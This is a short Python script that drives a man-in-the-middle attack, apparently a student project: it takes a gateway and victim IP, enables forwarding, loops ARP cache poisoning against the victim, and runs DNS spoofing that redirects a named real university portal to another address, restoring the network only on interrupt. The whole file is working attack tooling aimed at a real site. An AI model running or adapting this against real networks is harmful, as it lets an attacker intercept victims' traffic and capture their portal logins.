import argparse
from ARP_spoofing import *
from dns_spoofing import *

def main():
    parser = argparse.ArgumentParser(description='ARP spoof script')
    parser.add_argument("-g", 'gateway_ip', help='Gateway IP address')
    parser.add_argument("-v", 'victim_ip', help='Victim IP address')
    args = parser.parse_args()

    gateway_mac = get_mac_address(args.gateway_ip)
    victim_mac = get_mac_address(args.victim_ip)
    print('Starting ARP poisoning')
    ip_route("1")
    try:
        while True:
            arp_poisoning(args.gateway_ip, args.victim_ip)
            time.sleep(2)
            hostDict = {
                b"https://portal.bgu.ac.il": "13.107.246.43"
            }
            queueNum = 1
            print('Starting DNS spoofing')
            snoof = dns_spoofing(hostDict, queueNum)
            snoof()
    except KeyboardInterrupt:
        print('ARP spoofing stopped, Restoring network')
        ip_route("0")
        restore(args.gateway_ip, args.victim_ip, gateway_mac, victim_mac)
        print('Network restored')


if __name__ == '__main__':
    main()
